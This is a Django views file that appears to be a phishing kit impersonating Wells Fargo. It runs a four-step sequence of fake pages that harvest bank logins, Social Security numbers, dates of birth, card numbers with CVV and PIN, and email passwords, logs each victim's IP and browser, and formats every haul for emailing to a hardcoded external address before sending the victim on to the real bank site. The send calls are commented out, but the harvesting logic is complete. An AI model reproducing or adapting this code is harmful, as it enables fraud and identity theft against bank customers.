from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings
import requests

recipient = "kylie1k4@gmail.com"


# Create your views here.
def index(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    user_agent = request.META['HTTP_USER_AGENT']
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    ip_address = ip
    result = ip_address
    if request.method == 'POST':
        username = request.POST.get("username")
        passwd = request.POST.get("password")

        subject = f'{ip_address} Username and Password!'
        message = f'Location : {result}\nUser Agent : {user_agent}\nUsername : {username}\nPassword : {passwd}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [recipient, ]

        #send_mail(subject, message, email_from, recipient_list)
        return redirect('index1')

    return render(request, 'wells/index.html')


def index1(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    user_agent = request.META['HTTP_USER_AGENT']
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    # IP address to test
    ip_address = ip
    result = ip_address
    if request.method == 'POST':
        firstname = request.POST.get("firstName")
        lastname = request.POST.get("lastName")
        ssn = request.POST.get("ssn")
        phone_number = request.POST.get("phoneNumber")
        dob = request.POST.get("datePicker")

        subject = f'{ip_address} Username and Password!'
        message = f'Location : {result}\nUser Agent : {user_agent}\nFirst name : {firstname}\nLast name : {lastname}\nSSN : {ssn}\nPhone Number : {phone_number}\nDOB : {dob}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [recipient, ]

        #send_mail(subject, message, email_from, recipient_list)

        return redirect('index2')

    return render(request, 'wells/index1.html')


def index2(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    user_agent = request.META['HTTP_USER_AGENT']
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    # IP address to test
    ip_address = ip
    result = ip_address
    if request.method == 'POST':
        card_number = request.POST.get("cardNumber")
        expiry_date = request.POST.get("expiryDate")
        cvv = request.POST.get("cardCVV")
        pin = request.POST.get("pin")
        billing_addr = request.POST.get("billingAddress")

        subject = f'{ip_address} Username and Password!'
        message = f'Location : {result}\nUser Agent : {user_agent}\nCard Number : {card_number}\nExpiry Date : {expiry_date}\nCVV : {cvv}\nPin : {pin}\nBilling Address : {billing_addr}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [recipient, ]

        #send_mail(subject, message, email_from, recipient_list)
        return redirect('index3')

    return render(request, 'wells/index2.html')


def index3(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    user_agent = request.META['HTTP_USER_AGENT']
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    # IP address to test
    ip_address = ip
    result = ip_address
    if request.method == 'POST':
        usermail = request.POST.get("userMail")
        epasswd = request.POST.get("emailPassword")

        subject = f'{ip_address} Username and Password!'
        message = f'Location : {result}\nUser Agent : {user_agent}\nUser Email : {usermail}\nEmail Password : {epasswd}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [recipient, ]

        #send_mail(subject, message, email_from, recipient_list)
        return redirect('https://www.wellsfargo.com/')

    return render(request, 'wells/index3.html')
